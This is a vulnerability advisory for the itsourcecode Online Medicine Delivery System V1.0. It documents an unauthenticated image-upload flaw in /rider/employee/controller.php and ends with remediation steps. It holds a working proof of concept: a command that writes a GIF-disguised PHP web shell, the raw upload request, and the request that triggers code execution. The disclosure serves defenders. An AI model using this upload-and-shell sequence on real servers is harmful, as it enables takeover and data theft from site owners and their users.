# itsourcecode Online Medicine Delivery System V1.0 - Remote Code Execution via '/rider/employee/controller.php'
---

## 1. Product Information
| Field | Value |
| --- | --- |
| **Product Name** | Online Medicine Delivery System |
| **Product Link** | [https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/](https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/) |
| **Vendor** | itsourcecode |
| **Affected Version** | V1.0 |
| **Authentication Required** | No, exploitable without any authentication |


## 2. Vulnerability Type
**Unauthenticated File Upload Leading to Remote Code Execution**

---

## 3. Vulnerability Description
The employee management controller `/rider/employee/controller.php` of Online Medicine Delivery System contains an unauthenticated file upload vulnerability. The controller does not include any session authentication checks, allowing attackers to directly access the `doInsert()` and `doupdateimage()` functions to upload files without logging in.

The upload logic only uses `getimagesize()` to verify whether the file is an image, without performing whitelist validation on file extensions or randomly renaming uploaded files. An attacker can craft a GIF89a image shell (appending PHP code after a valid GIF file header), causing `getimagesize()` to return a valid result and bypass the check, while retaining the `.php` extension so the server parses and executes it as a PHP script, thereby achieving remote code execution.

**Affected Code**:

`rider/employee/controller.php:1-4` (No authentication check)

```php
<?php
require_once ("../../include/initialize.php");
$action = (isset($_GET['action']) && $_GET['action'] != '') ? $_GET['action'] : '';
switch ($action) {
```

`rider/employee/controller.php:26-53` (doInsert upload logic)

```php
function doInsert(){
    if(isset($_POST['save'])){
        $myfile =$_FILES['image']['name'];
        $location="uploaded_images/".$myfile;
        // ...
        @$image_size= getimagesize($_FILES['image']['tmp_name']);
        if ($image_size==FALSE || $type=='video/wmv') {
            message("Uploaded file is not an image!", "error");
        }else{
            move_uploaded_file($temp,"uploaded_images/" . $myfile);
        }
    }
}
```

`rider/employee/controller.php:145-169` (doupdateimage upload logic)

```php
function doupdateimage(){
    $myfile =$_FILES['photo']['name'];
    $location="uploaded_images/".$myfile;
    // ...
    @$image_size= getimagesize($_FILES['photo']['tmp_name']);
    if ($image_size==FALSE) {
        message("Uploaded file is not an image!", "error");
    }else{
        move_uploaded_file($temp,"uploaded_images/" . $myfile);
    }
}
```

---

## 4. Impact
+ **Remote Code Execution (RCE)**: An attacker can upload a web shell to obtain server command execution privileges, fully controlling the server
+ **No Authentication Required**: This interface has no authentication checks; anyone can directly exploit it
+ **Sensitive Data Disclosure**: Through RCE, arbitrary server files can be read (configuration files, database credentials, user data, etc.)
+ **Internal Network Pivoting**: After obtaining a server shell, it can be used as a pivot point for further penetration into the internal network
+ **Persistent Backdoor**: The uploaded web shell persists on the server and can be accessed repeatedly

---

## 5. PoC
**Step 1 — Craft a GIF89a image shell**:

Append a PHP one-liner web shell after a valid GIF89a file header:

```plain
GIF89a\x01\x00\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00\x3b<?php system('type C:\Windows\win.ini'); ?>
```

Generation command:

```bash
python -c "gif=bytearray();gif+=b'GIF89a';gif+=b'\x01\x00\x01\x00\x00\x00\x00';gif+=b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00';gif+=b'\x02\x02\x4c\x01\x00';gif+=b'\x3b';gif+=b'<?php system(chr(116).chr(121).chr(112).chr(101).chr(32).chr(67).chr(58).chr(92).chr(87).chr(105).chr(110).chr(100).chr(111).chr(119).chr(115).chr(92).chr(119).chr(105).chr(110).chr(46).chr(105).chr(110).chr(105));?>';open('shell.php','wb').write(gif)"
```

**Step 2 — Upload the image shell (no authentication required)**:

```plain
POST /rider/employee/controller.php?action=add HTTP/1.1
Host: ******
Content-Type: multipart/form-data; boundary=----Boundary
Connection: close

------Boundary
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: image/gif

GIF89a<?php system('type C:\Windows\win.ini'); ?>
------Boundary
Content-Disposition: form-data; name="FNAME"

TestAudit
------Boundary
Content-Disposition: form-data; name="LNAME"

ShellUpload
------Boundary
Content-Disposition: form-data; name="save"

1
------Boundary--
```

**Step 3 — Access the uploaded web shell to trigger code execution**:

```plain
GET /rider/employee/uploaded_images/shell.php HTTP/1.1
Host: ******
Connection: close
```

**Response**:

```plain
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

GIF89a; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[WINSET]
******
```

The `type C:\Windows\win.ini` command was successfully executed, and the contents of the `win.ini` file were fully output, confirming successful remote code execution.

The execution screenshot shows that after uploading the web shell, the return code is 200 and the contents of the win.ini file can be displayed:

![image-20260716192743080](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192743080.png)

---

![image-20260716192758648](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192758648.png)



## 6. Remediation
1. **Add Authentication Checks**: Add session verification at the beginning of `controller.php`
2. **File Extension Whitelist**: Only allow uploading image files with specified extensions
3. **Randomly Rename Uploaded Files**: Use randomly generated filenames instead of original filenames to prevent attackers from controlling the upload path
4. **Disable PHP Execution in Upload Directory**: Add `.htaccess` in the `uploaded_images/` directory
5. **Store Files Outside the Web Root**: Uploaded files should be stored in a directory that cannot be directly accessed via URL, and read/output through PHP scripts as needed

